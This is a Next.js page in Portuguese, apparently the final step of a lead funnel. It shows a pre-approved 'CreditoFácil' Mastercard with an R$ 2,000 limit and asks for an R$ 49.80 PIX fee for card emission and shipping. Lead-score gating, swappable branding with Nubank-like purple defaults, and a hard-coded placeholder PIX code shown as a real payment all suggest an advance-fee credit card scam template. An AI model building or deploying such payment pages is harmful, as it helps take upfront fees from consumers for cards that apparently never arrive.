'use client';

import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useRouter } from 'next/navigation';
import { Copy, Check, Lock, Smartphone, CheckCircle2, Loader2 } from 'lucide-react';
import { io } from 'socket.io-client';
import { generatePix } from '@/lib/api';
import AnimatedBackground from '@/components/AnimatedBackground';
import Chat from '@/components/Chat';
import { useSiteConfig } from '@/context/SiteConfigContext';
import BrandLogo from '@/components/BrandLogo';

export default function EmissaoPage() {
  const router = useRouter();
  const cfg = useSiteConfig();
  const [pix, setPix] = useState(null);
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(true);
  const [paymentDetected, setPaymentDetected] = useState(false);
  const [name, setName] = useState('');
  const [leadId, setLeadId] = useState(null);
  const socketRef = useRef(null);

  useEffect(() => {
    const n = sessionStorage.getItem('lead_name') || '';
    const id = sessionStorage.getItem('lead_id');
    setName(n);
    setLeadId(id);

    if (!sessionStorage.getItem('lead_score')) {
      router.push('/');
      return;
    }

    // Gera PIX
    generatePix({ amount: 49.80, leadId: id ? parseInt(id) : undefined })
      .then(data => { setPix(data); setLoading(false); })
      .catch(() => {
        // Fallback com QR code simulado
        setPix({
          pixCode: '00020126580014BR.GOV.BCB.PIX0136a1b2c3d4-e5f6-7890-abcd-ef1234567890520400005303986540549.805802BR5925CARTAO PREMIUM DIGITAL6009SAO PAULO62070503***63041A2B',
          qrCode: null,
          amount: 49.80,
          emission_fee: 19.90,
          shipping_fee: 29.90,
        });
        setLoading(false);
      });

    // Escuta confirmação automática de pagamento via SigiloPay webhook
    const sessionId = sessionStorage.getItem('chat_session');
    if (sessionId) {
      const sock = io(process.env.NEXT_PUBLIC_SOCKET_URL || 'http://localhost:3001', {
        transports: ['websocket', 'polling'],
      });
      socketRef.current = sock;
      sock.emit('user_join', { sessionId, name: n });
      sock.on('payment_confirmed', () => {
        setPaymentDetected(true);
        setTimeout(() => router.push('/confirmacao'), 1800);
      });
    }

    return () => {
      socketRef.current?.disconnect();
    };
  }, []);

  const handleCopy = async () => {
    if (!pix?.pixCode) return;
    try {
      await navigator.clipboard.writeText(pix.pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    } catch {
      // Fallback
      const el = document.createElement('textarea');
      el.value = pix.pixCode;
      document.body.appendChild(el);
      el.select();
      document.execCommand('copy');
      document.body.removeChild(el);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative">
      <AnimatedBackground />

      {/* Header */}
      <motion.div
        initial={{ y: -40, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        className="relative z-10 flex items-center justify-between p-6"
      >
        <button
          onClick={() => router.push('/endereco')}
          className="text-gray-500 hover:text-gray-900 transition-colors text-sm"
        >
          ← Voltar
        </button>
        <BrandLogo />
        <div className="flex items-center gap-2">
          {[1, 2, 3, 4].map((s) => (
            <div key={s} className={`h-2 rounded-full bg-brand-400 ${s === 4 ? 'w-6' : 'w-2'}`} />
          ))}
        </div>
      </motion.div>

      <div className="relative z-10 flex-1 flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-lg">

          {/* Título */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-center mb-8"
          >
            <span className="text-brand-600 text-sm font-medium">Etapa final</span>
            <h1 className="text-3xl font-black font-display text-gray-900 mt-2 mb-2">
              {cfg.funil?.emissaoTitulo || 'Emitir seu cartão'}
            </h1>
            <p className="text-gray-600">
              {cfg.funil?.emissaoSubtitulo || 'Pague a taxa de emissão via PIX e receba em casa'}
            </p>
          </motion.div>

          {/* Preview do cartão */}
          <motion.div
            initial={{ opacity: 0, y: 20, rotateX: -10 }}
            animate={{ opacity: 1, y: 0, rotateX: 0 }}
            transition={{ delay: 0.1, type: 'spring' }}
            className="mb-6"
            style={{ perspective: 1000 }}
          >
            <div
              className="relative rounded-3xl p-6 overflow-hidden"
              style={{
                background: `linear-gradient(135deg, ${cfg.cores?.cartaoCorInicio || '#820AD1'} 0%, ${cfg.cores?.cartaoCorMeio || '#4b047d'} 50%, ${cfg.cores?.cartaoCorFim || '#23023c'} 100%)`,
                border: '1px solid rgba(130,10,209,0.5)',
                boxShadow: `0 30px 80px ${cfg.cores?.cartaoCorInicio || '#820AD1'}55`,
              }}
            >
              <div className="absolute top-0 right-0 w-48 h-48 rounded-full opacity-20"
                style={{ background: 'radial-gradient(circle, #a060ff, transparent)', transform: 'translate(20%, -30%)' }} />
              <div className="absolute bottom-0 left-0 w-32 h-32 rounded-full opacity-10"
                style={{ background: 'radial-gradient(circle, #820AD1, transparent)', transform: 'translate(-30%, 30%)' }} />

              <div className="relative z-10 flex justify-between items-start mb-8">
                <span className="text-white/80 text-sm font-semibold tracking-[0.15em]">{(cfg.brand?.name || 'CreditoFácil').toUpperCase()}</span>
                <div className="flex gap-1 items-center">
                  <div className="w-8 h-8 rounded-full bg-yellow-400/80" />
                  <div className="w-8 h-8 rounded-full bg-orange-500/80 -ml-3" />
                  <span className="ml-2 text-white/60 text-xs">Mastercard</span>
                </div>
              </div>

              {/* Chip */}
              <div className="w-10 h-8 rounded-lg mb-5" style={{ background: 'linear-gradient(135deg, #d4a843, #a07c2e)' }}>
                <div className="w-full h-full rounded-lg border border-yellow-600/30 grid grid-cols-3 grid-rows-3 gap-px p-1">
                  {Array.from({ length: 9 }).map((_, i) => (
                    <div key={i} className="bg-yellow-600/20 rounded-sm" />
                  ))}
                </div>
              </div>

              <p className="text-white font-mono text-xl tracking-[0.2em] mb-6">
                •••• •••• •••• ****
              </p>

              <div className="flex items-end justify-between">
                <div>
                  <p className="text-white/40 text-xs tracking-widest mb-1">TITULAR</p>
                  <p className="text-white font-semibold uppercase tracking-wide">
                    {name.split(' ').slice(0, 2).join(' ') || 'SEU NOME'}
                  </p>
                </div>
                <div className="text-right">
                  <p className="text-white/40 text-xs tracking-widest mb-1">LIMITE</p>
                  <p className="text-green-400 font-bold text-xl">R$ 2.000</p>
                </div>
              </div>
            </div>
          </motion.div>

          {/* Valores */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.3 }}
            className="glass-dark rounded-2xl p-5 mb-5"
          >
            <h3 className="text-gray-900 font-bold mb-4">Resumo do pedido</h3>
            <div className="space-y-3">
              {[
                { label: 'Taxa de personalização e emissão', value: `R$ ${pix?.emission_fee?.toFixed(2) || '19,90'}`, desc: 'Personalização do cartão com seu nome' },
                { label: 'Frete e entrega com rastreio', value: `R$ ${pix?.shipping_fee?.toFixed(2) || '29,90'}`, desc: 'Envio via Correios com código de rastreamento' },
              ].map((item, i) => (
                <div key={i}>
                  <div className="flex justify-between items-center">
                    <div>
                      <p className="text-gray-700 text-sm">{item.label}</p>
                      <p className="text-gray-500 text-xs">{item.desc}</p>
                    </div>
                    <span className="text-gray-900 font-semibold">{item.value}</span>
                  </div>
                  {i === 0 && <div className="divider-gradient my-3" />}
                </div>
              ))}

              <div className="divider-gradient" />
              <div className="flex justify-between items-center">
                <span className="text-gray-900 font-bold">Total</span>
                <span className="text-green-400 font-black text-xl">
                  R$ {pix?.amount?.toFixed(2) || '49,80'}
                </span>
              </div>
            </div>
          </motion.div>

          {/* PIX */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="glass-dark rounded-2xl p-6 mb-5"
          >
            <div className="flex items-center gap-3 mb-5">
              <div className="w-10 h-10 rounded-xl bg-green-500/10 border border-green-500/20 flex items-center justify-center text-green-600">
                <Smartphone size={20} />
              </div>
              <div>
                <h3 className="text-gray-900 font-bold">Pagamento via PIX</h3>
                <p className="text-gray-600 text-xs">Aprovação imediata após pagamento</p>
              </div>
            </div>

            {loading ? (
              <div className="flex flex-col items-center py-8 gap-4">
                <div className="w-12 h-12 border-2 border-brand-400 border-t-transparent rounded-full animate-spin" />
                <p className="text-gray-400 text-sm">Gerando QR Code...</p>
              </div>
            ) : (
              <div className="flex flex-col items-center gap-5">
                {/* QR Code */}
                <div className="p-3 bg-white rounded-2xl">
                  {pix?.qrCode ? (
                    <img src={pix.qrCode} alt="QR Code PIX" className="w-48 h-48" />
                  ) : (
                    <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded-xl">
                      <div className="text-center text-gray-500 text-sm">
                        <Smartphone size={36} className="mx-auto mb-2 text-gray-400" />
                        <p>Use o código abaixo</p>
                      </div>
                    </div>
                  )}
                </div>

                <p className="text-gray-600 text-xs text-center">
                  Escaneie o QR Code com o app do seu banco ou use o código Copia e Cola
                </p>

                {/* Código PIX */}
                <div className="w-full">
                  <p className="text-gray-500 text-xs mb-2">Código Copia e Cola:</p>
                  <div className="flex gap-2">
                    <div className="flex-1 p-3 rounded-xl bg-gray-50 border border-gray-200 overflow-hidden">
                      <p className="text-gray-600 text-xs font-mono truncate">
                        {pix?.pixCode?.substring(0, 50)}...
                      </p>
                    </div>
                    <motion.button
                      onClick={handleCopy}
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                      className="px-4 rounded-xl font-semibold text-sm transition-all flex-shrink-0"
                      style={{
                        background: copied ? 'rgba(34,197,94,0.12)' : 'rgba(130,10,209,0.1)',
                        border: `1px solid ${copied ? 'rgba(34,197,94,0.35)' : 'rgba(130,10,209,0.3)'}`,
                        color: copied ? '#16a34a' : '#820AD1',
                      }}
                    >
                      <AnimatePresence mode="wait">
                        {copied ? (
                          <motion.span key="copied" initial={{ scale: 0 }} animate={{ scale: 1 }} className="flex items-center gap-1"><Check size={14}/> Copiado</motion.span>
                        ) : (
                          <motion.span key="copy" initial={{ scale: 0 }} animate={{ scale: 1 }} className="flex items-center gap-1"><Copy size={14}/> Copiar</motion.span>
                        )}
                      </AnimatePresence>
                    </motion.button>
                  </div>
                </div>
              </div>
            )}
          </motion.div>

          {/* Status de aguardando / confirmado */}
          <AnimatePresence mode="wait">
            {paymentDetected ? (
              <motion.div
                key="confirmed"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="w-full py-5 rounded-2xl flex items-center justify-center gap-3 font-display font-bold text-lg"
                style={{
                  background: 'linear-gradient(135deg, rgba(34,197,94,0.15), rgba(21,128,61,0.1))',
                  border: '1px solid rgba(34,197,94,0.4)',
                  color: '#16a34a',
                  boxShadow: '0 8px 32px rgba(34,197,94,0.15)',
                }}
              >
                <CheckCircle2 size={22} />
                Pagamento confirmado! Redirecionando...
              </motion.div>
            ) : (
              <motion.div
                key="waiting"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="w-full py-5 rounded-2xl flex flex-col items-center justify-center gap-2"
                style={{
                  background: 'rgba(130,10,209,0.06)',
                  border: '1px solid rgba(130,10,209,0.2)',
                }}
              >
                <div className="flex items-center gap-3">
                  <Loader2 size={20} className="animate-spin" style={{ color: '#820AD1' }} />
                  <span className="font-semibold text-gray-700">Aguardando confirmação do pagamento</span>
                </div>
                <p className="text-gray-500 text-xs">A confirmação é automática assim que o PIX for processado</p>
              </motion.div>
            )}
          </AnimatePresence>

          <p className="text-center text-gray-600 text-xs mt-3 flex items-center justify-center gap-1">
            <Lock size={11} /> Pagamento seguro · Confirmação automática via webhook PIX
          </p>
        </div>
      </div>

      <Chat userName={name} />
    </div>
  );
}
